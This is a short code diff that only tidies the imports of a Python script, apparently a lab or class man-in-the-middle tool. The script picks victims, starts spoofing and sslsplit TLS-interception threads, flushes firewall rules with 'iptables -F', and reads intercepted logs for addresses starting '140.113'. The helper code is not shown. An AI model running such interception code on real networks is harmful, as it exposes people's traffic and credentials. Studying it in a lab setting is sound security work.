@@ -1,16 +1,15 @@
 #!./.env/bin/python
-import scapy.all as scapy
-import threading
-import time
-import os
-
+from threading import Thread
+from time import sleep
 from utils import get_victims, trick, sslsplit, LOG_DIR
+import scapy.all as scapy
+import os
 
 
 def mitm():
-    time.sleep(8)
+    sleep(8)
     while True:
-        time.sleep(1)
+        sleep(1)
         for filename in os.scandir(LOG_DIR):
             if filename.is_file():
                 if '140.113' in filename.path:
@@ -29,9 +28,9 @@ def main():
     ips = get_victims()
     os.system('iptables -F')
     threads = list()
-    threads.append(threading.Thread(target=trick, args=[ips]))
-    threads.append(threading.Thread(target=sslsplit))
-    threads.append(threading.Thread(target=mitm))
+    threads.append(Thread(target=trick, args=[ips]))
+    threads.append(Thread(target=sslsplit))
+    threads.append(Thread(target=mitm))
     for t in threads:
         t.start()
 
